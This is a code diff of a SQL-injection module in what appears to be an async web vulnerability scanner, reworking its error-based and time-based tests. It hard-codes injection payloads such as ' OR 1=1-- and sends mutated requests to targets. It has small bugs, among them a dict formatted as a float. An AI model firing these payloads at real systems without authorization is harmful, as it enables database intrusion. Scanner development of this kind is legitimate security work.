@@ -1,11 +1,10 @@
-# components/attack/sqli.py
-
 import time
 import asyncio
 import re
 import xml.etree.ElementTree as ET
 from pathlib import Path
 from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
+import random
 
 from components.attack.base_attack import BaseAttack
 from components.main.logger import logger
@@ -16,27 +15,28 @@ class SQLInjection(BaseAttack):
     name = 'sqli'
 
     BOOLEAN_PAYLOAD_PAIRS = [
-        # simple numeric checks
         ("' OR 1=1-- ",   "' OR 1=2-- "),
         ("' OR 1=1# ",    "' OR 1=2# "),
         ("' OR 1=1/*",    "' OR 1=2/*"),
 
-        # quoted string checks
         ("' OR 'a'='a'-- ", "' OR 'a'='b'-- "),
         ('" OR "1"="1"-- ',  '" OR "1"="2"-- '),
 
-        # database-specific tweaks
         ("' OR EXISTS(SELECT 1)-- ", "' OR EXISTS(SELECT 0)-- "),
         ("' OR SLEEP(0)=0-- ",       "' OR SLEEP(0)=1-- "),
     ]
     
     UNION_REGEX = re.compile(r"union(?:.|\s)*select", re.IGNORECASE)
 
-    def __init__(self, crawler, crawler_config):
-        super().__init__(crawler, crawler_config)
-        self.crawler.context = None
-        self.payloads = self._load_payload_files()
+    def __init__(self, crawler, crawler_config, wordlist_path):
+        super().__init__(crawler, crawler_config, wordlist_path)
+        if not self.wordlist_path:
+            self.payloads = self._load_payload_files()
+            
         self.error_regexes = self._load_error_regexes()
+        
+        self.semaphore = asyncio.Semaphore(10)
+        self.baseline = {}
 
     def _load_payload_files(self):
         base = Path(__file__).parent.parent / 'payloads' / 'sqli'
@@ -45,8 +45,8 @@ class SQLInjection(BaseAttack):
             'time': 'sqli_time.txt',
             'union': 'sqli_union.txt',
             'auth_bypass': 'sqli_auth_bypass.txt',
-            'small' : 'sqli_small.txt',
         }
+        
         out = {}
         for kind, fname in mapping.items():
             path = base / fname
@@ -54,6 +54,7 @@ class SQLInjection(BaseAttack):
                 with open(path, encoding='utf-8') as f:
                     lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                 out[kind] = lines
+                
             except Exception as e:
                 logger.error(f"[sqli] cannot load payload file {path}: {e}")
                 out[kind] = []
@@ -99,97 +100,50 @@ class SQLInjection(BaseAttack):
     async def run(self, request, response):
         if not request.get_params and not request.post_params:
             return
-
-        method = request.method.upper()
-        params = request.get_params if method == 'GET' else request.post_params
-
-        sem = asyncio.Semaphore(10)
-
-        # 1) Error-based tests
-        async def try_error(param, payload):
-            async with sem:
-                #logger.debug(f"{request} Testing {param} (error) with payload {payload!r}")
-                return await self._test_error(request, param, payload)
+        
+        self.baseline[request] = response.elapsed
 
         error_tasks = [
-            asyncio.create_task(try_error(param, payload))
+            asyncio.create_task(
+                self._test_error(mutated, request, param, payload)
+            )
             for payload in self.payloads['error']
-            for param in params
+            for mutated, param in self.mutate_request(request, payload, mode='append')
         ]
-
-        done, pending = await asyncio.wait(error_tasks, return_when=asyncio.FIRST_COMPLETED)
-        for task in pending:
-            task.cancel()
-        for task in done:
-            try:
-                if task.result():
-                    return
-            except asyncio.CancelledError:
-                continue
-
-        async def try_boolean(param):
-            async with sem:
-                #logger.debug(f"{request} Testing {param} with boolean payloads")
-                return await self._test_boolean(request, param)
-
-        bool_tasks = [
-            asyncio.create_task(try_boolean(param))
-            for param in params
-        ]
-
-        done, pending = await asyncio.wait(bool_tasks, return_when=asyncio.FIRST_COMPLETED)
-        for task in pending:
-            task.cancel()
-        for task in done:
-            try:
-                if task.result():
-                    return
-            except asyncio.CancelledError:
-                continue
-
-        async def try_time(param, payload):
-            async with sem:
-                #logger.debug(f"{request} Testing {param} (time) with payload {payload!r}")
-                return await self._test_time(request, param, payload)
-
-        time_tasks = [
-            asyncio.create_task(try_time(param, payload))
-            for payload in self.payloads['time']
-            for param in params
-        ]
-
-        done, pending = await asyncio.wait(time_tasks, return_when=asyncio.FIRST_COMPLETED)
-        for task in pending:
-            task.cancel()
-        for task in done:
-            try:
-                if task.result():
-                    return
-            except asyncio.CancelledError:
-                continue
-
-
-    def _build_request(self, request, param, payload):
-        parts = urlparse(request.url)
         
-        if request.method == 'GET':
-            qs = dict(parse_qsl(parts.query))
-            qs[param] = qs.get(param, '') + payload
-            
-            new_qs = urlencode(qs, doseq=True)
-            new_url = urlunparse(parts._replace(query=new_qs))
-            
-            return Request(new_url, method='GET')
-        
-        else:
-            body = dict(request.post_params or {})
-            body[param] = body.get(param, '') + payload
-            
-            return Request(request.url, method='POST', post_params=body)
-        
+        try:
+            for task in asyncio.as_completed(error_tasks):
+                if await task:
+                    for t in error_tasks:
+                        t.cancel()
+                    return
+        finally:
+            for t in error_tasks:
+                if not t.done():
+                    t.cancel()
+
+        # time_tasks = [
+        #     asyncio.create_task(
+        #         self._test_time(mutated, request, param, payload)
+        #     )
+        #     for payload in self.payloads['time']
+        #     for mutated, param in self.mutate_request(request, payload, mode='replace')
+        # ]
+        # try:
+        #     for task in asyncio.as_completed(time_tasks):
+        #         if await task:
+        #             for t in time_tasks:
+        #                 t.cancel()
+        #             return
+        # finally:
+        #     for t in time_tasks:
+        #         if not t.done():
+        #             t.cancel()
+
+
     def _find_error(self, text):
         
-        text_small = text[:20000]
+        text_small = text
         for dbms, regexes in self.error_regexes.items():
             for regex in regexes:
                 if regex.search(text_small):
@@ -209,26 +163,28 @@ class SQLInjection(BaseAttack):
             
         return False
 
-    async def _test_error(self, request, param, payload):
+    async def _test_error(self, mutated, request, param, payload):
         
-        attack_request = self._build_request(request, param, payload)
+        if param == 'user_token':
+            return False
+        logger.debug(f"{mutated} Testing {param} (error) with payload {payload!r}")
         
         try:
-            resp = await self.crawler.send(attack_request, timeout = 1)
-            text = resp.text
+            async with self.semaphore:
+                resp = await self.crawler.send(mutated, timeout = 3, redirect = False)
+                text = resp.text
             
         except Exception as e:
-            logger.error(f"[sqli] request failed for {attack_request.url}: {e}")
+            logger.error(f"Error-based request failed {mutated}: {e}")
             return False
         
-
         else:
             vulnerability = self._find_error(text)
 
             if vulnerability and not await self._false_positive(request):
-                logger.critical(f'SQL Injection Error Based | {attack_request.url} with vulnerable parameter {param} using payload {payload}')
+                logger.critical(f'SQL Injection Error Based | {mutated.url} with vulnerable parameter {param} using payload {payload}')
                 
-                logger.log("VULN", f'Target: {attack_request.url} {attack_request.method}')
+                logger.log("VULN", f'Target: {mutated.url} {mutated.method}')
                 logger.log("VULN", f'Parameter: {param}')
                 logger.log("VULN", f'Payload: {payload}')
                 logger.log("VULN", f'Possbile CVE: {vulnerability} {self.search_cve(vulnerability)['description']}')
@@ -237,63 +193,38 @@ class SQLInjection(BaseAttack):
                 return True
                 
             return False        
-            
-    async def _test_boolean(self, request, param) -> bool:
- 
-        for true_pl, false_pl in self.BOOLEAN_PAYLOAD_PAIRS:
-
-            true_req  = self._build_request(request, param, true_pl)
-            false_req = self._build_request(request, param, false_pl)
-
-            try:
-                resp_true  = await self.crawler.send(true_req,  timeout=3)
-                resp_false = await self.crawler.send(false_req, timeout=3)
-                
-            except Exception as e:
-                logger.error(f"[sqli][boolean] network error for {param}: {e}")
-                continue
-
-            if resp_true.status_code != resp_false.status_code:
-                logger.critical(f"Boolean SQLi detected by status code | {true_req.url} param={param}")
-                break
 
 
-            len_true  = len(resp_true.text or "")
-            len_false = len(resp_false.text or "")
-            
-            if abs(len_true - len_false) > 20:  # tweak threshold as needed
-                logger.critical(f"Boolean SQLi detected | {true_req.url} param={param} Δ={abs(len_true-len_false)}")
-         
-                logger.log("VULN", f"Parameter: {param}")
-                logger.log("VULN", f"True payload:  {true_pl}")
-                logger.log("VULN", f"False payload: {false_pl}")
-                print()
-                
-                return True
+    async def _test_time(self, mutated, request, param: str, payload: str) -> bool:
+        threshold = 5.0 
+        margin = 0.5 
+        path = mutated.path
+        
+        logger.debug(f"{mutated} Testing {param} (error) with payload {payload!r}")
 
-        return False
-
-
-
-    async def _test_time(self, request, param, payload, threshold: float = 2.0) -> bool:
-
-        attack_req = self._build_request(request, param, payload)
+        # 2) Send mutated request under semaphore
         start = time.time()
-
         try:
-            await self.crawler.send(attack_req, timeout=threshold + 1)
-            elapsed = time.time() - start
-            
-        except Exception:
-            elapsed = time.time() - start
+            async with self.semaphore:
+                await asyncio.wait_for(self.crawler.send(mutated, redirect=False), timeout=threshold + 2)
+        except asyncio.TimeoutError:
+            return False
+        
+        elapsed = time.time() - start
 
-        if elapsed > threshold:
-            logger.critical(f"Time-based SQLi detected | {attack_req.url} param={param} (delay ≈ {elapsed:.1f}s)")
+        # 3) Compute extra delay beyond baseline
+        extra = elapsed - self.baseline[request].total_seconds()
+
+        # 4) Flag if close to the injected sleep
+        if extra >= (threshold - margin):
+            logger.critical(
+                f"Time-based SQLi detected | {mutated.url} param={param} "
+                f"(total={elapsed:.2f}s, baseline={self.baseline:.2f}s)"
+            )
             logger.log("VULN", f"Parameter: {param}")
-            logger.log("VULN", f"Payload:   {payload}")
-            logger.log("VULN", f"Delay ms:  {int(elapsed * 1000)}")
+            logger.log("VULN", f"Payload: {payload!r}")
+            logger.log("VULN", f"Extra delay: {extra:.3f}s")
             print()
-            
             return True
 
         return False
